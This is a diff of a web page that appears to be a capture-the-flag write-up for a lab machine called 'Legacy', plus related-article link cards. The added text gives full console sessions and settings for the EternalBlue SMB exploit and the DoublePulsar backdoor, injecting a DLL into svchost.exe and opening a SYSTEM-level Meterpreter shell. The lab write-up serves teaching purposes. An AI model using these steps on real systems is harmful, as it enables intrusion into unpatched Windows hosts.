+[*]  Mode :: Delivery mechanism
+
+    0) DANE     Forward deployment via DARINGNEOPHYTE
+*-&gt; 1) FB       Traditional deployment from within FUZZBUNCH
+
+[?] Mode [0] : 1
+[+] Run Mode: FB
+
+[?] This will execute locally like traditional Fuzzbunch plugins. Are you sure? (y/n) [Yes] : y
+[*] Redirection OFF
+
+[+] Configure Plugin Local Tunnels
+[+] Local Tunnel - local-tunnel-1
+[?] Destination IP [10.10.10.4] : 
+[?] Destination Port [445] : 
+[+] (TCP) Local 10.10.10.4:445
+
+[+] Configure Plugin Remote Tunnels</code></pre></div></div>
+
+<p>These are our final settings for EternalBlue:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">Module: Eternalblue
+===================
+
+Name                  Value                                                 
+----                  -----                                                 
+DaveProxyPort         0                                                     
+NetworkTimeout        60                                                    
+TargetIp              10.10.10.4                                            
+TargetPort            445                                                   
+VerifyTarget          True                                                  
+VerifyBackdoor        True                                                  
+MaxExploitAttempts    3                                                     
+GroomAllocations      12                                                    
+ShellcodeBuffer                                                             
+Target                XP</code></pre></div></div></p>
+
+<p>Now let&rsquo;s execute it:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">[?] Execute Plugin? [Yes] : y    
+[*] Executing Plugin
+[*] Connecting to target for exploitation.
+    [+] Connection established for exploitation.
+[*] Pinging backdoor...
+    [+] Backdoor not installed, game on.
+[*] Forcing MaxExploitAttempts to 1.
+[*] Target OS selected valid for OS indicated by SMB reply
+[*] CORE raw buffer dump (12 bytes):
+0x00000000  57 69 6e 64 6f 77 73 20 35 2e 31 00              Windows 5.1.
+[*] Fingerprinting SMB non-paged pool quota
+    [+] Allocation total: 0xfff4
+    [+] Spray size: 0
+    [+] Allocation total: 0x1ffe8
+    [+] Spray size: 1
+    [+] Allocation total: 0x2ffdc
+    [+] Spray size: 2
+    [+] Allocation total: 0x3ffd0
+    [+] Spray size: 3
+    [+] Allocation total: 0x4ffc4
+    [+] Spray size: 4
+    [+] Allocation total: 0x5ffb8
+    [+] Spray size: 5
+    [+] Allocation total: 0x6ffac
+    [+] Spray size: 6
+    [+] Allocation total: 0x7ffa0
+    [+] Spray size: 7
+    [+] Allocation total: 0x8ff94
+    [+] Spray size: 8
+    [+] Allocation total: 0x9ff88
+    [+] Spray size: 9
+    [+] Allocation total: 0xaff7c
+    [+] Spray size: 10
+    [+] Allocation total: 0xbff70
+    [+] Spray size: 11
+    [+] Quota NOT exceeded after 12 packets
+    [+] Allocation total: 0xbff70
+[*] Building exploit buffer
+[*] Sending all but last fragment of exploit packet
+    ................DONE.
+[*] Sending SMB Echo request
+[*] Good reply from SMB Echo request
+[*] Starting non-paged pool grooming
+    [+] Sending 2 non-paged pool fragment packets
+        ....DONE.
+    [+] Sent 2 non-paged pool fragment packets ofsize 0x00006FF9
+    [+] Sending 10 non-paged pool grooming packets
+        ..........DONE.
+    [+] Sent 10 non-paged pool grooming packets - groom complete
+[*] Sending SMB Echo request
+[*] Good reply from SMB Echo request
+[*] Sending last fragment of exploit packet!
+    DONE.
+[*] Receiving response from exploit packet
+    [+] ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] Triggering free of corrupted buffer.
+[*] Pinging backdoor...
+    [+] Backdoor returned code: 10 - Success!
+    [+] Ping returned Target architecture: x86 (32-bit)
+    [+] Backdoor installed
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[*] CORE sent serialized output blob (2 bytes):
+0x00000000  08 00                                            ..
+[*] Received output parameters from CORE
+[+] CORE terminated with status code 0x00000000
+[+] Eternalblue Succeeded</code></pre></div></div></p>
+
+<h3 id="executing-doublepulsar">Executing DoublePulsar</h3>
+
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">fb Special (Eternalblue) &gt; use DoublePulsar
+
+[!] Entering Plugin Context :: Doublepulsar
+[*] Applying Global Variables
+[+] Set NetworkTimeout =&gt; 60
+[+] Set TargetIp =&gt; 10.10.10.4
+
+[*] Applying Session Parameters
+
+[!] Enter Prompt Mode :: Doublepulsar
+
+Module: Doublepulsar
+====================
+
+Name              Value                                                 
+----              -----                                                 
+NetworkTimeout    60                                                    
+TargetIp          10.10.10.4                                            
+TargetPort        445                                                   
+OutputFile                                                              
+Protocol          SMB                                                   
+Architecture      x86                                                   
+Function          OutputInstall                                         
+
+[!] Plugin Variables are NOT Valid
+[?] Prompt For Variable Settings? [Yes] : 
+[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds).  Use -1 for no timeout.
+[?] NetworkTimeout [60] : 
+[*]  TargetIp :: Target IP Address
+[?] TargetIp [10.10.10.4] : 
+[*]  TargetPort :: Port used by the Double Pulsar back door
+[?] TargetPort [445] : 
+[*]  Protocol :: Protocol for the backdoor to speak
+
+*-&gt; 0) SMB     Ring 0 SMB (TCP 445) backdoor
+    1) RDP     Ring 0 RDP (TCP 3389) backdoor
+
+[?] Protocol [0] : 
+[*]  Architecture :: Architecture of the target OS
+
+*-&gt; 0) x86     x86 32-bits
+    1) x64     x64 64-bits
+
+[?] Architecture [0] : 
+[*]  Function :: Operation for backdoor to perform
+
+    0) OutputInstall     Only output the install shellcode to a binary file on disk.
+    1) Ping              Test for presence of backdoor
+*-&gt; 2) RunDLL            Use an APC to inject a DLL into a user mode process.
+    3) RunShellcode      Run raw shellcode
+    4) Uninstall         Remove&#39;s backdoor from system
+
+[?] Function [0] : 2
+[+] Set Function =&gt; RunDLL
+[*]  DllPayload :: DLL to inject into user mode
+[?] DllPayload [] : 
+[*]  DllPayload :: DLL to inject into user mode
+[?] DllPayload [] : C:\shell.dll
+[+] Set DllPayload =&gt; C:\shell.dll
+[*]  DllOrdinal :: The exported ordinal number of the DLL being injected to call
+[?] DllOrdinal [1] : 
+[*]  ProcessName :: Name of process to inject into
+[?] ProcessName [lsass.exe] : svchost.exe    
+[+] Set ProcessName =&gt; svchost.exe
+[*]  ProcessCommandLine :: Command line of process to inject into
+[?] ProcessCommandLine [] : 
+
+[!] Preparing to Execute Doublepulsar
+[*] Redirection OFF
+[+] Configure Plugin Local Tunnels
+[+] Local Tunnel - local-tunnel-1
+[?] Destination IP [10.10.10.4] : 
+[?] Destination Port [445] : 
+[+] (TCP) Local 10.10.10.4:445
+
+[+] Configure Plugin Remote Tunnels</code></pre></div></div>
+
+<p>These are our final settings for DoublePulsar:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">Module: Doublepulsar
+====================
+
+Name                  Value                                                 
+----                  -----                                                 
+NetworkTimeout        60                                                    
+TargetIp              10.10.10.4                                            
+TargetPort            445                                                   
+DllPayload            C:\shell.dll                                          
+DllOrdinal            1                                                     
+ProcessName           svchost.exe                                           
+ProcessCommandLine                                                          
+Protocol              SMB                                                   
+Architecture          x86                                                   
+Function              RunDLL</code></pre></div></div></p>
+
+<p><strong>It&rsquo;s important to change the ProcessName from lsass.exe to svchost.exe !!!</strong>  Now, let&rsquo;s execute it:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">[?] Execute Plugin? [Yes] : 
+[*] Executing Plugin
+[+] Selected Protocol SMB
+[.] Connecting to target...
+[+] Connected to target, pinging backdoor...
+    [+] Backdoor returned code: 10 - Success!
+    [+] Ping returned Target architecture: x86 (32-bit) - XOR Key: 0x00811F87
+    SMB Connection string is: Windows 5.1
+    Target OS is: XP x86
+    [+] Backdoor installed
+    [+] DLL built
+    [.] Sending shellcode to inject DLL
+    [+] Backdoor returned code: 10 - Success!
+    [+] Backdoor returned code: 10 - Success!
+    [+] Backdoor returned code: 10 - Success!
+    [+] Command completed successfully
+[+] Doublepulsar Succeeded
+Back to metasploit:
+
+[*] Sending stage (179267 bytes) to 10.10.10.4
+[*] Meterpreter session 1 opened
+
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM :D</code></pre></div></div></p>
 
         </div>
 
         <aside>
           <div class="p-share centered">
-            <a href="http://www.facebook.com/sharer.php?src=bm&u=https%3a%2f%2falamot.github.io%2fess%2f&t=Evolutionarily%20Stable%20Strategies%20%28available%20in%20greek%20only%29" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-facebook"></i></a>
-            <a href="https://plus.google.com/share?url=https%3a%2f%2falamot.github.io%2fess%2f" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-google-plus"></i></a>
-            <a lang="en" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2fess%2f&text=Evolutionarily%20Stable%20Strategies%20%28available%20in%20greek%20only%29&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
-            <a lang="el" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2fess%2f&text=%ce%95%ce%be%ce%b5%ce%bb%ce%b9%ce%ba%cf%84%ce%b9%ce%ba%ce%ac%20%ce%a3%cf%84%ce%b1%ce%b8%ce%b5%cf%81%ce%ad%cf%82%20%ce%a3%cf%84%cf%81%ce%b1%cf%84%ce%b7%ce%b3%ce%b9%ce%ba%ce%ad%cf%82&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
-            <a lang="en" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2fess%2f&description=Evolutionarily%20Stable%20Strategies%20%28available%20in%20greek%20only%29&media=https://alamot.github.io/images/hawkdove.png" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
-            <a lang="el" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2fess%2f&description=%ce%95%ce%be%ce%b5%ce%bb%ce%b9%ce%ba%cf%84%ce%b9%ce%ba%ce%ac%20%ce%a3%cf%84%ce%b1%ce%b8%ce%b5%cf%81%ce%ad%cf%82%20%ce%a3%cf%84%cf%81%ce%b1%cf%84%ce%b7%ce%b3%ce%b9%ce%ba%ce%ad%cf%82&media=https://alamot.github.io/images/hawkdove.png" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
+            <a href="http://www.facebook.com/sharer.php?src=bm&u=https%3a%2f%2falamot.github.io%2flegacy_writeup%2f&t=Legacy%20write-up" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-facebook"></i></a>
+            <a href="https://plus.google.com/share?url=https%3a%2f%2falamot.github.io%2flegacy_writeup%2f" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-google-plus"></i></a>
+            <a lang="en" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2flegacy_writeup%2f&text=Legacy%20write-up&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
+            <a lang="el" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2flegacy_writeup%2f&text=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20Legacy&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
+            <a lang="en" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2flegacy_writeup%2f&description=Legacy%20write-up&media=https://alamot.github.io/images/legacy.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
+            <a lang="el" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2flegacy_writeup%2f&description=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20Legacy&media=https://alamot.github.io/images/legacy.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
           </div>
         </aside>
       </article>
@@ -456,113 +722,17 @@ if (language) {
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/multifunctional_proteins/" class="clearfix">
+  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/multifunction.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Multifunctional proteins and evolution (available in greek only)</h3>
-      <h3 class="title" lang="el">Πολυλειτουργικές πρωτεΐνες και εξέλιξη</h3>
+      <h3 class="title" lang="en">Node write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Node</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">17 Jan 2012</time>
-      <time lang="el">17 Ιαν 2012</time>
+      <time lang="en">03 Mar 2018</time>
+      <time lang="el">03 Μαρ 2018</time>
     </footer>
   </a>
 </article>
@@ -573,16 +743,36 @@ if (language) {
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/evolution_of_cetaceans/" class="clearfix">
+  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dolphin.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">The evolution of Cetaceans (available in greek only)</h3>
-      <h3 class="title" lang="el">Η εξέλιξη των Kητωδών</h3>
+      <h3 class="title" lang="en">Mantis write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">17 Nov 2011</time>
-      <time lang="el">17 Νοε 2011</time>
+      <time lang="en">18 Feb 2018</time>
+      <time lang="el">18 Φεβ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Optimum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">28 Oct 2017</time>
+      <time lang="el">28 Οκτ 2017</time>
     </footer>
   </a>
 </article>
@@ -628,6 +818,22 @@ if (language) {
            
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/rold/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/rold.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Retriever of Lost Dreams</h3>
+      <h3 class="title" lang="el">Ο Ιχνηλάτης των Χαμένων Ονείρων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">16 Aug 2015</time>
+      <time lang="el">16 Αυγ 2015</time>
+    </footer>
+  </a>
+</article>
+
+           
           
            
            
@@ -641,8 +847,24 @@ if (language) {
            
            
           
+           
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/matchsticks/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/matchsticks.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Alamot&#39;s matchstick puzzles</h3>
+      <h3 class="title" lang="el">Σπιρτοσπαζοκεφαλιές</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">11 Mar 2014</time>
+      <time lang="el">11 Μαρ 2014</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -913,8 +1135,6 @@ if (language) {
            
            
           
-          
-           
            
            
            
@@ -922,24 +1142,39 @@ if (language) {
            
            
            
+          
+           
            
+           
           
+           
+           
            
+          
            
            
            
           
+           
            
            
+          
            
            
+           
           
+           
            
            
+          
+           
            
            
           
            
+           
+           
+          
            
            
            
@@ -947,14 +1182,23 @@ if (language) {
            
            
            
+          
+           
            
+           
           
+           
            
            
+          
+           
            
            
           
            
+           
+           
+          
            
            
            
@@ -962,33 +1206,43 @@ if (language) {
            
            
            
+          
+           
            
+           
           
+           
+           
            
+          
            
            
            
           
+           
            
            
+          
            
            
+           
+          
           
            
            
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/testakia_viologias/" class="clearfix">
+  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/testakia_viologias.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Biology tests (available in greek only)</h3>
-      <h3 class="title" lang="el">Τεστάκια Βιολογίας</h3>
+      <h3 class="title" lang="en">Reverse shells</h3>
+      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">22 Aug 2015</time>
-      <time lang="el">22 Αυγ 2015</time>
+      <time lang="en">12 Apr 2018</time>
+      <time lang="el">12 Απρ 2018</time>
     </footer>
   </a>
 </article>
@@ -1034,90 +1288,6 @@ if (language) {
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/mindcontrol_parasites/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/brain_signals.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Mind control parasites. How do they do it?</h3>
-      <h3 class="title" lang="el">Παράσιτα που ελέγχουν το μυαλό. Πώς το κάνουν;</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">03 Oct 2013</time>
-      <time lang="el">03 Οκτ 2013</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/amylpred2/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/amylpred2.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">A consensus method for the prediction of aggregation-prone peptides in globular proteins</h3>
-      <h3 class="title" lang="el">Μια συναινετική μέθοδος πρόγνωσης πεπτιδίων που εμφανίζουν τάση προς συσσωμάτωση στις σφαιρικές πρωτεΐνες</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">10 Jan 2013</time>
-      <time lang="el">10 Ιαν 2013</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/amyloids/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/amyloid.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Amyloid fibrils (available in greek only)</h3>
-      <h3 class="title" lang="el">Αμυλοειδή ινίδια</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">11 Jul 2012</time>
-      <time lang="el">11 Ιουλ 2012</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/centrioles/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/centrioles.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Centrioles (available in greek only)</h3>
-      <h3 class="title" lang="el">Κεντριόλια</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">22 Jan 2012</time>
-      <time lang="el">22 Ιαν 2012</time>
-    </footer>
-  </a>
-</article>
-
-           
           
            
            
@@ -1133,126 +1303,10 @@ if (language) {
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/smallest_genome/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/microscope.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">The organism with the smallest genome and proteome</h3>
-      <h3 class="title" lang="el">Ο οργανισμός με το μικρότερο γονιδιώμα και πρωτέωμα</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">06 Aug 2011</time>
-      <time lang="el">06 Αυγ 2011</time>
-    </footer>
-  </a>
-</article>
-
-           
           
            
            
            
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/entomopathogenic_fungi/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/ep_fungi.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Entomopathogenic fungi (available in greek only)</h3>
-      <h3 class="title" lang="el">Εντομοπαθογόνοι μύκητες</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">22 Nov 2010</time>
-      <time lang="el">22 Νοε 2010</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/intraspecific_and_interspecific_competition/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/competition.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Intraspecific and Interspecific competition (available in greek only)</h3>
-      <h3 class="title" lang="el">Ενδοειδικός και Διαειδικός ανταγωνισμός</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">17 Nov 2010</time>
-      <time lang="el">17 Νοε 2010</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/theories_of_intelligence/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/intelligence.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Theories of intelligence (available in greek only)</h3>
-      <h3 class="title" lang="el">Θεωρίες νοημοσύνης</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">01 Jun 2010</time>
-      <time lang="el">01 Ιουν 2010</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/microvilli/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/microvilli.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Microvilli (available in greek only)</h3>
-      <h3 class="title" lang="el">Μικρολάχνες</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">08 Jan 2010</time>
-      <time lang="el">08 Ιαν 2010</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/electric_current_and_human_body/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/electric.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Electric current and human body (available in greek only)</h3>
-      <h3 class="title" lang="el">Ηλεκτρικό ρεύμα και ανθρώπινο σώμα</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">01 Jun 2009</time>
-      <time lang="el">01 Ιουν 2009</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
@@ -1274,21 +1328,105 @@ if (language) {
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/brucellosis/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/Brucella.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Brucellosis (available in greek only)</h3>
-      <h3 class="title" lang="el">Βρουκέλλωση (Μελιταίος πυρετός)</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">21 Mar 2004</time>
-      <time lang="el">21 Μαρ 2004</time>
-    </footer>
-  </a>
-</article>
-
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
            
           
            
